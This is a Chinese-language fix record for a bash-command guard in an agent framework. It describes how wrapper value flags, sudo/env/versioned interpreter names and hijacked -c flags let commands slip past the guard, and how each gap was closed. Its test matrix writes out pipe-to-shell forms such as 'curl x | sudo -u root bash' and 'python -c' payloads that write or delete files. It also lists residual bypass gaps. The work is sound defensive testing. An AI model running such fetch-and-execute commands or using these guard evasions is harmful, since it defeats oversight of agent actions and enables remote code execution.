---
id: F20261022vwfg
title: 值参 wrapper 盲区收编——带值旗标吞食 + -c 载荷 relay 换 resolveExecHead 基座（M-c36b9847）
summary: "M-c36b9847 值参 wrapper 盲区治理（#1604 记档残余）+ M-3fc9962b B+1 长旗标落钉。基线复现：8/8 带值分写形态全 ALLOW 漏放（curl|sudo -u root bash 等——skipWrapperArgs 不吞值 token，段首落值词走丢执行名）；连带实证同族两活洞：包装/版本名/分发器 -c 载荷 relay 裸 argv0 键控不递归（sudo python -c 'touch 主仓' 同款 ALLOW）+ 载荷旗标扫描可被值词劫持。修法三件套同轮（缺 B 即 block→allow 保护回退）：A=valueFlags 值吞食（必带值旗标对称入表；可选值旗标不入表、执行词值不吞保守归位——delta 严重 1 零翻转）+ sudo 吞尽回退 shell（sudo(8) 实证，nice/nohup 反证不入表）；B=matchInterpreterPayloads 换 resolveExecHead 基座（SCRIPT_RUNNERS 双清单收敛）；C=载荷旗标扫描限 headIndex 后。"
capability_test: "n/a: 判定语义收编由行为矩阵钉死——bash-guard-value-wrapper-flags 域覆盖矩阵（43 形态 + 域覆盖断言防选择偏差 + 段首归位机制钉 + 两侧识别域一致）+ pipe-direct-exec 22 形态同判表更新 + 全量 6677 passed 零失败。golden 豁免声明（沿 #1318/#1377 先例）：不涉 golden_replay 断言面，无 golden-results.jsonl 记录系按设计不落账"
change_type: fix
intent:
  problem: "M-c36b9847：env -u FOO bash / sudo -u root bash 等带值 wrapper 不被 skipWrapperArgs 吞食，段首解析落在值词（FOO/root/KILL）上走 FILE 口径——curl|sudo -u root bash 一族 8/8 形态实测 ALLOW（真实 RCE 面：管道上游内容被 shell 执行零判定）。基线复现中连带实证两处同族活洞：①matchInterpreterPayloads 裸 argv0 键控使包装/版本名/分发器形态 -c 载荷从不递归（sudo python -c 'touch 主仓落点'、env python -c、python3.11 -c、busybox sh -c 全 ALLOW，裸形态同尺 BLOCK——判罚分叉）；②载荷旗标全段扫描可被 wrapper 值词劫持（sudo -p -c python -c '载荷'）。与 main 同判非回退，全部 pre-existing"
  expected_effect: "值参分写/内联/合写/交错形态段首归位真实执行词：喂入面 curl|sudo -u root python 一族由 ALLOW 转正定因拦截；-c 载荷面进窄通道（os.remove 类 fail-closed、touch 主仓落点入账拦截）；吞尽回退面 curl|sudo（无命令跑 shell）转拦截而 curl|nice / env -u FOO（无命令不执行）保持放行；防贪婪对照（sudo -n bash / env -i python）与良性对照（sudo -u root ls / env -u FOO ls）判罚不动；既有意外拦截面（盲区 -c 形态）经 relay 机制性保持拦截，零保护回退"
  verify_by:
    type: capability_test
modules:
  - src/frameworks/agent/payload-extract-aux.ts
  - src/frameworks/agent/command-model.ts
  - src/frameworks/agent/write-target-evaluator.ts
from:
  - F20261021pdex
created_in_conversation: 7b41e085-5c21-4bd1-adfe-dc3ef051753d
doc_type: feature
tags: ["guard", "wrapper", "value-flags", "payload-relay", "fail-closed", "bugfix", "security"]
created_at: 2026-10-22T10:30:00+08:00
---

## 问题（基线复现）

### 漏面一：值参分写形态段首走丢执行名（M-c36b9847 主张，实证成立）

`skipWrapperArgs`（payload-extract-aux.ts，guard/wte 共享内层）的 flags 规则只吞连续 `-` 开头 token，**带值旗标分写形态的值 token 不被吞**，段首解析落在值词上：

```
curl x | sudo -u root bash    → head="root"（应为 bash）→ 判定链不进 → ALLOW
curl x | env -u FOO python    → head="foo"  → ALLOW
curl x | timeout -s KILL 5 bash → head="kill" → ALLOW
curl x | stdbuf -o 0 python   → head=""     → ALLOW
```

基线探针 8/8 分写形态全 ALLOW（/tmp/probe-baseline2.json 证据留痕），真实 RCE 面：管道上游不透明内容被 shell/解释器执行而零判定。表内注释早已 sketched `takesValue` 设计（「若最后一个被吞旗标在 takesValue 集合…再吞一个 token」）但从未实现，delta r1 明文记档「归 wrapper 基座治理，不在本次收编面」。

### 漏面二：-c 载荷 relay 裸 argv0 键控（基线复现中连带发现）

`matchInterpreterPayloads`（command-model.ts）按 `seg.argv0.split("/").pop()` 判解释器族——**不跳 wrapper、不归一版本名**：

```
python -c 'touch /repo/data/pwn'        → wte=write:/repo/data/pwn → BLOCK ✓（relay 递归出子模型）
sudo python -c 'touch /repo/data/pwn'   → wte=[] → ALLOW ✗（argv0="sudo" 不在词表，载荷从不递归）
env python -c 'touch /repo/data/pwn'    → ALLOW ✗
python3.11 -c 'touch /repo/data/pwn'    → ALLOW ✗（"python3.11" 不在 SCRIPT_RUNNERS）
busybox sh -c 'touch /repo/data/pwn'    → ALLOW ✗（"busybox" 不在 SHELL_INTERPRETERS）
```

### 漏面三：载荷旗标全段扫描被值词劫持

`evalScriptPayloadNarrow` 用 `words.findIndex(w => w.evaluated === "-c")` 全段扫描——`sudo -p -c python -c '载荷'` 中 -p 的 prompt 值恰为 "-c"，载荷旗标位被劫持（真载荷漏判）。

## 修法（三件套同轮落地——缺 B 即保护回退）

### A. skipWrapperArgs 值吞食（payload-extract-aux.ts）

`WrapperSpec.valueFlags`：必带值旗标的短/长拼写对称入表。表内清单（穷举，注释/表/本文档枚举节三处同轴，测试穷举锁机械保障）：

- env: -u/--unset/-C/--chdir/-S/--split-string
- nice: -n/--adjustment
- timeout: -s/--signal/-k/--kill-after
- watch: -n/--interval
- stdbuf: -o/--output/-e/--error/-i/--input
- sudo: -u/--user/-g/--group/-U/--other-user/-p/--prompt/-C/--close-from/-D/--chdir/-R/--chroot/-T/--command-timeout/-r/--role/-t/--type
- xargs: -I/-n/--max-args/-d/--delimiter/-P/--max-procs/-s/--max-chars/-L/-a/--arg-file

吞食循环改为单 while 交错吞（flags+值 / assigns / duration），多值旗标交错（sudo -u root -g wheel）自然覆盖。三条硬边界（delta 严重 1 教训固化）：

1. **只收「必带值」旗标**——GNU 可选值旗标（值只能合写：xargs -i[replace-str] / --replace[=str] / -l[max-lines] / --max-lines[=n]）一律不入表：分写时后随 token 是命令不是值（`xargs -i bash` 的 bash 是命令）；
2. **后随值 token 形似执行词时不吞**（looksLikeExecWord：解释器/壳/分发器/wrapper/写命令/git/取数族）——保守归位为段首，与基线判罚零翻转（同命令不得反判）；`env -u bash ls` 的 head 归位 bash 而非 ls 即此边界（放弃语义归位换零翻转）；
3. **表内每项必有矩阵钉**——穷举断言防选择性覆盖（w-xargs 域曾恰好绕开自埋错旗标，正是严重 1 漏网机制）。

无值旗标（sudo -n / env -i / sudo -E）不吞，对照矩阵钉住；值恰为解释器名（`sudo -u bash` / `env -u bash`）按边界 2 保守归位。

**吞尽回退**（resolveExecHead）：wrapper 吞尽全段无执行词时，真实语义是 wrapper 的默认执行——`sudo` 无命令跑 shell（sudo(8)「If no command is specified, an interactive shell is executed」man 实证），`curl | sudo` / `curl | sudo -u root` / `curl | sudo -t bash` 按 sh 归位 fail-closed；反向实证 nice/nohup 无命令仅 usage 报错（本机实测）不入回退表，`curl | nice` 保持放行；setsid 本机无从实证按残余记档。

### B. matchInterpreterPayloads 换 resolveExecHead 基座（command-model.ts）

段首判定从裸 argv0 换 resolveExecHead 共享内层（wrapper 跳过 + 版本名归一 + 多调分发器归位），-c/-e 扫描限 headIndex 之后（防值词伪装）。SCRIPT_RUNNERS 本地副本删除、归 payload-extract-aux 单一真相源（双份清单正是识别域漂移源）。command-model → payload-extract-aux 值引用无运行时 cycle（aux 对 command-model 仅 import type）。

**为什么必须与 A 同轮**：盲区形态（如 `sudo -u root python -c 'touch 主仓'）修复前被 guard 文本通道意外拦截（payload 词面含写词+主仓路径）；A 单独落地后段首归位 python，payload 被 python 载荷通道消费而 `touch /repo/data/pwn` 在 python 文法下是只读除法表达式 → 放行 = **block→allow 保护回退**。B 落地后 relay 递归出子模型 `touch /repo/data/pwn`（shell 语义）→ 写落点入账 → 机制性拦截（与裸形态同判）。B 面同时收编漏面二四形态。

### C. evalScriptPayloadNarrow 扫描限 headIndex 之后（write-target-evaluator.ts）

载荷旗标定位改 `findIndex((w, i) => i > execHead.headIndex && ...)`——`sudo -p -c python -c 'touch …'` 的 prompt 值 "-c" 不再劫持旗标位，真载荷正常判定。

## 验证证据

### 判罚矩阵（/tmp 探针留痕 + 测试钉死）

| 形态族 | 修复前 | 修复后 |
|---|---|---|
| `curl \| sudo -u root bash` 等 8 分写 feed 形态 | ALLOW（漏放） | **BLOCK**（管道喂入定因） |
| `curl \| sudo --user root python`（B+1 长旗标分写） | ALLOW | **BLOCK** |
| `curl \| sudo --user=root python`（B+1 内联） | BLOCK | BLOCK（pin 不回归） |
| `sudo/env python -c 'touch 主仓'`（relay 漏面） | ALLOW | **BLOCK**（写落点入账） |
| `python3.11 -c` / `busybox sh -c 'touch 主仓'` | ALLOW | **BLOCK** |
| `sudo -u root python -c 'os.remove(…)'` | ALLOW | **BLOCK**（fail-closed） |
| `sudo -u root python -c 'touch 主仓'` | BLOCK（文本通道意外） | BLOCK（relay 机制性，零回退） |
| `curl \| sudo` / `sudo -u root` / `sudo -t bash`（吞尽） | ALLOW | **BLOCK**（shell 回退） |
| `curl \| nice` / `env -u FOO`（吞尽非 shell） | ALLOW | ALLOW（pin） |
| `sudo -n bash` / `env -i python`（防贪婪） | BLOCK | BLOCK（pin） |
| `sudo -u root ls` / `env -u FOO ls`（良性） | ALLOW | ALLOW（pin） |

### 测试面

- 新增 `bash-guard-value-wrapper-flags.test.ts`：43 形态域覆盖矩阵 + REQUIRED_DOMAINS 覆盖断言（防选择偏差）+ 段首归位机制钉（16 形态 resolveExecHead 断言）+ 两侧识别域一致参数化；
- `bash-guard-pipe-direct-exec.test.ts`：22 形态同判表收编 2 形态进 FEED_FORMS，「残余诚实钉」（现状钉 none）翻为「收编钉」（stdin）——断言强度不变（两侧同判双断言保留），仅预期随修复翻转；
- 全量 417 文件 6677 passed 零失败；touchstone 语料全绿（语料内 xargs -I{} 为合写形态不受值吞食影响）；lint / lint:tests 通过。

## delta 复核处置（检视獭1611 严重 1，2026-10-22）

**发现（审视主张，双版本对拍实证）**：valueFlags 表混入 GNU 可选值旗标（xargs -i/--replace/-l/--max-lines）与 env -P，分写形态值吞食吃掉命令词 → head=null → 7+ 形态 block→allow 保护回退，「零保护回退」主张被打破；三重自相矛盾（代码入表 vs 注释「可选值旗标不入表」vs 本文档枚举节未列）。

**本方复现与扩大**：对拍复现 8/8 审视形态，并扩大发现同族 7 形态（xargs -I python / timeout -s python / nice -n python / stdbuf -o python / watch -n python / sudo -p python / env -u bash 类——**必带值旗标** + 执行词值），删 5 项 alone 收不掉（它们不在删单上）。

**处置（裁决 4 项全覆盖 + 扩大族收口）**：

1. 表删 5 项（xargs -i/--replace/-l/--max-lines、env -P）——可选值旗标分写后随 token 是命令，回基线正确判罚；
2. 回归形态全补钉：8 审视形态 + 7 扩大族 + 2 命令词值形态共 17 形态钉 BLOCK/基线锚定（含 `env -u FOO -P bash` 穿透形态）；
3. 三重矛盾消除：注释/表/枚举节三处同轴 + 测试穷举锁（改表不同步即断）；
4. 防选择性覆盖：「表内每项必有矩阵钉」穷举断言（flag-coverage 44 形态逐项入钉）。

**新增机制（扩大族的收口件）**：looksLikeExecWord 值吞食守卫——值 token 形似执行词（解释器/壳/分发器/wrapper/写命令/git/取数族）时不吞、保守归位段首。缺此件时删 5 项仍留扩大族翻转。全族对拍 22/22 判罚与基线一致（含 `sudo -u root` 新拦收紧面保持）。

**残余（诚实边界）**：

- 值吞食语义取舍：`env -u bash ls` head 保守归位 bash（真实命令是 ls）——放弃语义归位换基线零翻转；
- 未知命令词（无专门判定面）做值时两侧判罚同为放行，吞值不产生翻转，不入守卫词表（不军备化 #1513）；
- `env -P /bin bash` 类（删 -P 后走 flags 吞食盲区）回基线漏放态（pre-existing）——按 M-3fe59a8e 先例 env -P 处理属外延扩张须搭档点头，不随本 PR 扩面。

## 残余与边界

- **setsid 吞尽数义未实证**（本机无 setsid）：`curl | setsid` 若平台 setsid 无命令跑 $SHELL 则仍漏——记档待实证（nice/nohup 反向实证已排除）；
- **sudo 信息面误伤**：`curl | sudo -l/-V` 等信息型形态会被 shell 回退拦下（真实语义不执行）——fail-closed 侧取舍（#1513 之尺），可用性代价限于荒谬形态；
- **wrapper 值吞食表是已知词的旗标语法描述**（表的既定职责），未入表的带值旗标（如 sudo -h 歧义旗标）走既有残余面，非穷举军备化（#1513）。
